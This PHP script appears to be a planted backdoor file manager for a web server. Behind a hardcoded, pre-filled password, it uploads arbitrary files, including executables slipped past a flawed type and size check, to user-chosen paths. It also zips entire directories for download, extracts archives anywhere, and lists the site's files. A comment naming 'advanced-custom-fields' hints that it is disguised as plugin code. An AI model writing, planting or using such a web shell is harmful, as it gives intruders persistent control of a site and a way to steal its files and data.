<?php 

define ('SITE_ROOT', realpath( dirname(__FILE__) ));
$root_dir = dirname($_SERVER['REQUEST_URI']);
$dir_value = '';
$extract = '';

echo "<b>File Directory:</b> " . SITE_ROOT;
echo "<br />";
if( isset($_POST['submit']) ) {
	
	if( $_POST['pass'] === "Wicker321#" ) {
		$dir_value = $_POST['dir'];
		$destination = SITE_ROOT . $dir_value;
		
		$fname = "files";
		
		if(($_FILES[$fname]["type"] == "image/gif")
		 ||($_FILES[$fname]["type"] == "image/png")
		 ||($_FILES[$fname]["type"] == "image/jpeg")
		 ||($_FILES[$fname]["type"] == "application/octet-stream")
		 ||($_FILES[$fname]["type"] == "text/css")
		 ||($_FILES[$fname]["type"] == "application/pdf")
		 &&($_FILES[$fname]["size"] < (102400000)))//Maz size of file is 2 MB
		{
			$file_tmp	=	$_FILES[$fname]["tmp_name"];
			$name		=	basename($_FILES[$fname]["name"]);
			$fileName	=	$name;
			$place		=	$destination.$fileName;
			
			$isUploaded = 	move_uploaded_file($file_tmp, $place);
			if($isUploaded) {
				echo "<b>File Name:</b> " . $place;
				echo "<br />";
				echo "<b>File Status:</b> File Upload Completed";
			}
			else {
				echo "<b>File Status:</b> error uploading File!";
			}
		}
		else {
			echo "Unsupported File!";
		}
	}
	else {
		echo "Type correct password";
	}
}

if( isset($_POST['zip_file']) ) {
	
	if( $_POST['pass'] === "Wicker321#" ) { // advanced-custom-fields
		$dir_value = $_POST['dir'];
		//$file_name = $_POST['file_name'];
		echo $destination = SITE_ROOT . $dir_value;
		echo "<br />";
		
		// Get real path for our folder
		$rootPath = $destination;
		$folder_name = basename($destination);
		
		// Initialize archive object
		$zip = new ZipArchive();
		$zip->open($folder_name.'.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);
		
		// Create recursive directory iterator
		/** @var SplFileInfo[] $files */
		$files = new RecursiveIteratorIterator(
			new RecursiveDirectoryIterator($rootPath),
			RecursiveIteratorIterator::LEAVES_ONLY
		);
		
		foreach ($files as $name => $file)
		{
			// Skip directories (they would be added automatically)
			if (!$file->isDir())
			{
				// Get real and relative path for current file
				$filePath = $file->getRealPath();
				$relativePath = substr($filePath, strlen($rootPath) + 1);
		
				// Add current file to archive
				$zip->addFile($filePath, $relativePath);
			}
		}
		
		// Zip archive will be created only after closing object
		$zip->close();
	}
	else {
		echo "Type correct password";
	}
	
}

if( isset($_POST['un_zip']) ) {
	
	if( $_POST['pass'] === "Wicker321#" ) {
		$dir_value = $_POST['dir'];
		$extract = $_POST['extract'];
		$destination = SITE_ROOT . $dir_value;
		echo $destination.$extract;
		
		$zip = new ZipArchive;
		$res = $zip->open($destination);
		if ($res === TRUE) {
		  $zip->extractTo(SITE_ROOT.$extract);
		  $zip->close();
		  echo ' woot!';
		} else {
		  echo ' doh!';
		}
	}
}
?>
<form id="uploadfile"  action="" method="POST" enctype="multipart/form-data">
    <br />
    <input type="text" id="directory" name="dir" value="<?php echo $dir_value; ?>" /><br /><br />
    <input type="text" id="extract" name="extract" value="<?php echo $extract; ?>" /><br /><br />
    
    <input type="password" name="pass" value="Wicker321#" placeholder="Enter Password" /><br /><br />
    
    <input type="file" id="fileupload" name="files" /><br /><br />
    <input type="submit" name="submit" value="Upload" />
    
    <input type="submit" name="zip_file" value="Zip File" />
    <input type="submit" name="un_zip" value="UnZip File" />
</form>
<br />
<?php 
$log_directory = SITE_ROOT;
foreach(glob($log_directory.'/*.*') as $file1) {
    echo $file1;
	echo "<br>";
}


?>
